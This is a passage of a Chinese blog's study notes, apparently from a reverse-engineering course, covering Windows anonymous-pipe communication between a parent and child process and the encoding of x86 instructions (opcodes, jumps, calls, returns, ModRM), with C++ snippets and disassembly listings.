class=\"string\">&quot;Error&quot;</span>),MB_OK);\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">STARTUPINFO si;\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">PROCESS_INFORMATION pi;\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"built_in\">ZeroMemory</span>(&amp;si,<span class=\"built_in\">sizeof</span>(STARTUPINFO));\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">si.cb = <span class=\"built_in\">sizeof</span>(STARTUPINFO);\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">si.dwFlags = STARTF_USESTDHANDLES;\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">si.hStdInput = hRead;\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">si.hStdOutput = hWrite;\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">si.hStdError = <span class=\"built_in\">GetStdHandle</span>(STD_ERROR_HANDLE);\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"built_in\">CreateProcess</span>(<span class=\"string\">&quot;E:\\\\Project\\\\zzzzzzz\\\\Debug\\\\zzzzzzz.exe&quot;</span>,<span class=\"literal\">NULL</span>,<span class=\"literal\">NULL</span>,<span class=\"literal\">NULL</span>,TRUE,<span class=\"number\">0</span>,<span class=\"literal\">NULL</span>,<span class=\"literal\">NULL</span>,&amp;si,&amp;pi))\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"built_in\">CloseHandle</span>(hRead);\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"built_in\">CloseHandle</span>(hWrite);\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\thRead = <span class=\"literal\">NULL</span>;\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\thWrite = <span class=\"literal\">NULL</span>;\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"built_in\">MessageBox</span>(<span class=\"number\">0</span>,<span class=\"built_in\">TEXT</span>(<span class=\"string\">&quot;创建子进程失败!&quot;</span>),<span class=\"built_in\">TEXT</span>(<span class=\"string\">&quot;Error&quot;</span>),MB_OK);\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"keyword\">else</span>\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"built_in\">CloseHandle</span>(pi.hProcess);\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"built_in\">CloseHandle</span>(pi.hThread);\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"comment\">//写数据\t\t\t\t\t\t\t\t\t\t</span></span><br><span class=\"line\">TCHAR szBuffer[] = <span class=\"string\">&quot;http:\\\\www.dtdebug.com&quot;</span>;\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">DWORD dwWrite;\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"built_in\">WriteFile</span>(hWrite,szBuffer,<span class=\"built_in\">strlen</span>(szBuffer)+<span class=\"number\">1</span>,&amp;dwWrite,<span class=\"literal\">NULL</span>))\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"built_in\">MessageBox</span>(<span class=\"number\">0</span>,<span class=\"built_in\">TEXT</span>(<span class=\"string\">&quot;写数据失败!&quot;</span>),<span class=\"built_in\">TEXT</span>(<span class=\"string\">&quot;Error&quot;</span>),MB_OK);\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"comment\">//读数据\t\t\t\t\t\t\t\t\t\t</span></span><br><span class=\"line\">TCHAR szBuffer[<span class=\"number\">100</span>];\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">DWORD dwRead;\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"built_in\">ReadFile</span>(hRead,szBuffer,<span class=\"number\">100</span>,&amp;dwRead,<span class=\"literal\">NULL</span>))\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"built_in\">MessageBox</span>(<span class=\"literal\">NULL</span>,<span class=\"built_in\">TEXT</span>(<span class=\"string\">&quot;读取数据失败!&quot;</span>),<span class=\"built_in\">TEXT</span>(<span class=\"string\">&quot;Error&quot;</span>),MB_OK);\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"keyword\">else</span>\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"built_in\">MessageBox</span>(<span class=\"literal\">NULL</span>,szBuffer,<span class=\"built_in\">TEXT</span>(<span class=\"string\">&quot;[读取数据]&quot;</span>),MB_OK);\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">子进程：\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"comment\">//初始化\t\t\t\t\t\t\t\t\t\t</span></span><br><span class=\"line\">HANDLE hRead = <span class=\"built_in\">GetStdHandle</span>(STD_INPUT_HANDLE);\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">HANDLE hWrite = <span class=\"built_in\">GetStdHandle</span>(STD_OUTPUT_HANDLE);  \t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"comment\">//读数据\t\t\t\t\t\t\t\t\t\t</span></span><br><span class=\"line\">TCHAR szBuffer[<span class=\"number\">100</span>];\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">DWORD dwRead;\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"built_in\">ReadFile</span>(hRead,szBuffer,<span class=\"number\">100</span>,&amp;dwRead,<span class=\"literal\">NULL</span>))\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"built_in\">MessageBox</span>(<span class=\"literal\">NULL</span>,<span class=\"built_in\">TEXT</span>(<span class=\"string\">&quot;读取数据失败!&quot;</span>),<span class=\"built_in\">TEXT</span>(<span class=\"string\">&quot;Error&quot;</span>),MB_OK);\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"keyword\">else</span>\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"built_in\">MessageBox</span>(<span class=\"literal\">NULL</span>,szBuffer,<span class=\"built_in\">TEXT</span>(<span class=\"string\">&quot;[读取数据]&quot;</span>),MB_OK);\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"comment\">//写数据\t\t\t\t\t\t\t\t\t\t</span></span><br><span class=\"line\">TCHAR szBuffer[<span class=\"number\">100</span>] = <span class=\"string\">&quot;匿名管道&quot;</span>;\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">DWORD dwWrite;\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"built_in\">WriteFile</span>(hWrite,szBuffer,<span class=\"built_in\">strlen</span>(szBuffer)+<span class=\"number\">1</span>,&amp;dwWrite,<span class=\"literal\">NULL</span>))\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"built_in\">MessageBox</span>(<span class=\"literal\">NULL</span>,<span class=\"built_in\">TEXT</span>(<span class=\"string\">&quot;写入数据失败!&quot;</span>),<span class=\"built_in\">TEXT</span>(<span class=\"string\">&quot;Error&quot;</span>),MB_OK);\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>还可以使用命名管道，共享文件，dll 共享节实现进程通信</p>\n<h2 id=\"硬编码\"><a class=\"markdownIt-Anchor\" href=\"#硬编码\">#</a> 硬编码</h2>\n<p>指令编码结构</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230920123148804.png\" alt=\"image-20230920123148804\"></p>\n<p>每一条指令，最短 1 字节，最长 15 字节</p>\n<h3 id=\"经典定长指定\"><a class=\"markdownIt-Anchor\" href=\"#经典定长指定\">#</a> 经典定长指定</h3>\n<p>定长指令由 opcode 就可以确定长度</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00489001 &gt;  50              push eax</span><br><span class=\"line\">00489002    51              push ecx</span><br><span class=\"line\">00489003    52              push edx</span><br><span class=\"line\">00489004    53              push ebx</span><br><span class=\"line\">00489005    54              push esp</span><br><span class=\"line\">00489006    55              push ebp</span><br><span class=\"line\">00489007    56              push esi</span><br><span class=\"line\">00489008    57              push edi</span><br><span class=\"line\"></span><br><span class=\"line\">00489009    58              pop eax</span><br><span class=\"line\">0048900A    59              pop ecx</span><br><span class=\"line\">0048900B    5A              pop edx</span><br><span class=\"line\">0048900C    5B              pop ebx</span><br><span class=\"line\">0048900D    5C              pop esp</span><br><span class=\"line\">0048900E    5D              pop ebp</span><br><span class=\"line\">0048900F    5E              pop esi</span><br><span class=\"line\">00489010    5F              pop edi</span><br><span class=\"line\"></span><br><span class=\"line\">00489011    60              pushad</span><br><span class=\"line\">00489012    61              popad</span><br><span class=\"line\"></span><br><span class=\"line\">00489013    40              inc eax</span><br><span class=\"line\">00489014    41              inc ecx</span><br><span class=\"line\">00489015    42              inc edx</span><br><span class=\"line\">00489016    43              inc ebx</span><br><span class=\"line\">00489017    44              inc esp</span><br><span class=\"line\">00489018    45              inc ebp</span><br><span class=\"line\">00489019    46              inc esi</span><br><span class=\"line\">0048901A    47              inc edi</span><br><span class=\"line\"></span><br><span class=\"line\">0048901B    48              dec eax</span><br><span class=\"line\">0048901C    49              dec ecx</span><br><span class=\"line\">0048901D    4A              dec edx</span><br><span class=\"line\">0048901E    4B              dec ebx</span><br><span class=\"line\">0048901F    4C              dec esp</span><br><span class=\"line\">00489020    4D              dec ebp</span><br><span class=\"line\">00489021    4E              dec esi</span><br><span class=\"line\">00489022    4F              dec edi</span><br><span class=\"line\"></span><br><span class=\"line\">00489023    B0 00           mov al,0x0</span><br><span class=\"line\"></span><br><span class=\"line\">00489023    B0 00           mov al,0x0</span><br><span class=\"line\">00489025    B1 00           mov cl,0x0</span><br><span class=\"line\">00489027    B2 00           mov dl,0x0</span><br><span class=\"line\">00489029    B3 00           mov bl,0x0</span><br><span class=\"line\"></span><br><span class=\"line\">0048902B    B4 00           mov ah,0x0</span><br><span class=\"line\">0048902D    B5 00           mov ch,0x0</span><br><span class=\"line\">0048902F    B6 00           mov dh,0x0</span><br><span class=\"line\">00489031    B7 00           mov bh,0x0</span><br><span class=\"line\"></span><br><span class=\"line\">00489033    B8 008D8594     mov eax,0x94858D00</span><br><span class=\"line\">00489038    B9 BA0050FF     mov ecx,0xFF5000BA</span><br><span class=\"line\">0048903D    BA A90F0000     mov edx,0xFA9</span><br><span class=\"line\">00489042    BB 858C0400     mov ebx,0x48C85</span><br><span class=\"line\">00489047    BC 8BF08D7D     mov esp,0x7D8DF08B</span><br><span class=\"line\">0048904C    BD 5756FF95     mov ebp,0x95FF5657</span><br><span class=\"line\">00489051    BE 0F0000AB     mov esi,0xAB00000F</span><br><span class=\"line\">00489056    BF 00AE75FD     mov edi,0xFD75AE00</span><br><span class=\"line\"></span><br><span class=\"line\">0048905B    91              xchg eax,ecx</span><br><span class=\"line\">0048905C    92              xchg eax,edx</span><br><span class=\"line\">0048905D    93              xchg eax,ebx</span><br><span class=\"line\">0048905E    94              xchg eax,esp</span><br><span class=\"line\">0048905F    95              xchg eax,ebp</span><br><span class=\"line\">00489060    96              xchg eax,esi</span><br><span class=\"line\">00489061    97              xchg eax,edi</span><br><span class=\"line\">00489062    98              cwde</span><br><span class=\"line\">00489063    99              cdq</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、0x70 - 0x7F \t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">条件跳转，后跟一个字节立即数的偏移(有符号)，共两个字节。\t\t\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">如果条件成立，跳转到 当前指令地址 + 当前指令长度 + Ib\t\t\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">最大值：向前跳7f，向后跳80\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">004082A0 &gt;   /70 1B         jo      short 004082BD\t\t\t\t\t; &lt; 7f 往下跳 &gt;7F 往上跳</span><br><span class=\"line\">004082A2     |71 11         jno     short 004082B5</span><br><span class=\"line\">004082A4     |72 11         jb      short 004082B7</span><br><span class=\"line\">004082A6     |73 11         jnb     short 004082B9</span><br><span class=\"line\">004082A8     |74 11         je      short 004082BB</span><br><span class=\"line\">004082AA     |75 11         jnz     short 004082BD                   ;  SE 处理程序安装</span><br><span class=\"line\">004082AC     |76 11         jbe     short 004082BF</span><br><span class=\"line\">004082AE     |77 11         ja      short 004082C1</span><br><span class=\"line\">004082B0     |78 11         js      short 004082C3</span><br><span class=\"line\">004082B2     |79 11         jns     short 004082C5</span><br><span class=\"line\">004082B4     |7A 11         jpe     short 004082C7</span><br><span class=\"line\">004082B6     |7B 11         jpo     short 004082C9</span><br><span class=\"line\">004082B8     |7C 11         jl      short 004082CB</span><br><span class=\"line\">004082BA     |7D 11         jge     short 004082CD</span><br><span class=\"line\">004082BC     |7E 11         jle     short 004082CF</span><br><span class=\"line\">004082BE      7F 11         jg      short 004082D1</span><br><span class=\"line\"></span><br><span class=\"line\">2、0x0F 0x80 - 0x0F 0x8F\t\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">条件跳转，后跟四个字节立即数的偏移(有符号)，共五个字节。\t\t\t\t\t     \t\t\t\t\t\t</span><br><span class=\"line\">如果条件成立，跳转到 当前指令地址 + 当前指令长度 + Id\t\t\t\t\t</span><br><span class=\"line\">最大值：向前跳7FFFFFFFF，向后跳80000000\t\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">004082C0    - 0F80 578965E8 jo      E8A60C1D</span><br><span class=\"line\">004082C6    - 0F81 64B14300 jno     00843430</span><br><span class=\"line\">004082CC    - 0F82 943000A1 jb      A140B366</span><br><span class=\"line\">004082D2    - 0F83 4300C1E8 jnb     E901831B</span><br><span class=\"line\">004082D8      0F84 FF000000 je      004083DD</span><br><span class=\"line\">004082DE    - 0F85 8943008B jnz     8B40C66D</span><br><span class=\"line\">004082E4    - 0F86 94300081 jbe     8140B37E</span><br><span class=\"line\">004082EA    - 0F87 00000089 ja      894082F0</span><br><span class=\"line\">004082F0    - 0F88 8943008B js      8B40C67F</span><br><span class=\"line\">004082F6    - 0F89 894300C1 jns     C140C685</span><br><span class=\"line\">004082FC      0F8A 03152089 jpe     89609805</span><br><span class=\"line\">00408302      0F8B 89151889 jpo     89589891 </span><br><span class=\"line\">00408308    - 0F8C A1148943 jl      43C997AF</span><br><span class=\"line\">0040830E    - 0F8D E81025FF jge     FF6593FC</span><br><span class=\"line\">00408314    - 0F8E 00A31489 jle     8955261A</span><br><span class=\"line\">0040831A    - 0F8F 6A00E8CD jg      CE28838A</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">3、其他指令\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">0xE0  \tLOOPNE/LOOPNZ Ib (Jb)\t\t\t共2字节\t\t\t\t\t\t</span><br><span class=\"line\">\tECX = ECX - 1  当ZF = 0 &amp;&amp; ECX!=0 时跳转到 当前指令地址 + 当前指令长度 + Ib \t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">0XE1     \tLOOPE/LOOPZ Ib (Jb)\t\t\t共2字节\t\t\t\t\t\t</span><br><span class=\"line\">\tECX = ECX - 1  当ZF = 1 &amp;&amp; ECX != 0 时跳转到 当前指令地址 + 当前指令长度 + Ib\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">0XE2\tLOOP Ib (Jb)\t\t\t共2字节\t\t\t\t\t\t</span><br><span class=\"line\">\tECX = ECX - 1  当 ECX!=0 时跳转到 当前指令地址 + 当前指令长度 + Ib\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">0XE3\tJrCXZ Ib (Jb) (在32位模式中,rCX为ECX)\t\t\t\t\t共2字节\t\t\t\t</span><br><span class=\"line\">\t当 ECX = 0 时跳转到 当前指令地址 + 当前指令长度 + Ib\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t(自己控制步长)\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">0xE8\tCALL Id (Jd)  \t\t共5字节\t\t\t\t\t\t\t</span><br><span class=\"line\">\tCALL指令的下一条指令地址入栈后，跳转到 当前指令地址 + 当前指令长度 + Id\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">0xE9\tJMP Id (Jd)\t\t共5字节\t\t\t\t\t\t\t</span><br><span class=\"line\">\t跳转到 当前指令地址 + 当前指令长度 + Id\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">8个段寄存器： ES CS SS DS FS GS LDTR TR (顺序固定)\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t(段寄存器实际是个结构体，共96位，其中仅16位是汇编指令可以访问到的）\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">0xEA\tJMP Ap （Ap：六字节长度的直接地址）\t\t\t\t共7字节\t\t\t\t\t</span><br><span class=\"line\">\tJMP CS:Id  将Ap中的高2位赋值给CS，低4位直接赋值给EIP， 即跳转\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">004183D7 &gt;    EA 12345678 1B00     JMP FAR 001B:78563412\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">0xEB\tJMP Ib (Jb)\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t跳转到 当前指令地址 + 当前指令长度 + Ib\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">0xC3 \tRET\t共1字节\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\tEIP出栈\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">0xC2\tRET Iw\t共3字节\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\tEIP出栈后，ESP = ESP + Iw\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">0XCB\tRETF （return far） 共1字节\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t出栈8个字节，低4个字节赋值给EIP,高4个字节中低2位赋值给CS \t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">0xCA\tRETF Iw\t共3字节\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t出栈8个字节，低4个字节赋值给EIP,高4个字节中低2位赋值给CS后，ESP = ESP + Iw \t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">ret  -&gt; pop eip\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">retf -&gt; pop eip, pop cs\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00408320      EA 12345678 0B00    jmp     far 000B:78563412</span><br><span class=\"line\">00408327    - E9 750A6A1C         jmp     1CAA8DA1</span><br><span class=\"line\">0040832C    ^ EB CF               jmp     short 004082FD</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"经典变长指令\"><a class=\"markdownIt-Anchor\" href=\"#经典变长指令\">#</a> 经典变长指令</h3>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x88</span>  \tMOV Eb, Gb\t\t\tG：通用寄存器\t\t\t</span><br><span class=\"line\"><span class=\"number\">0x89</span>\tMOV Ev, Gv\t\t\tE：寄存器/内存\t\t\t</span><br><span class=\"line\"><span class=\"number\">0x8A</span>\tMOV Gb, Eb\t\t\tb：字节\t\t\t</span><br><span class=\"line\"><span class=\"number\">0x8B</span>\tMOV Gv, Ev\t\t\tv：Word, doubleword <span class=\"keyword\">or</span> quadword\t\t\t取决于平台</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">00</span>A291BC    <span class=\"number\">880400</span>          mov byte ptr ds:[eax+eax],al\t\t\t</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ModRM:</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230923180030444.png\" alt=\"image-20230923180030444\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230923180307438.png\" alt=\"image-20230923180307438\"></p>\n<p>Mod (第 6、7 位) 和 R/M (第 0、1、2 位) 共同描述指令中的 E 部分，即寄存器 / 内存</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230923180807179.png\" alt=\"image-20230923180807179\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230923181238014.png\" alt=\"image-20230923181238014\"></p>\n<p>8815 没有这条 ebp 的指令，被 32 位偏移代替  00010101</p>\n<p>00A291D0    8815 B59D0500   mov byte ptr 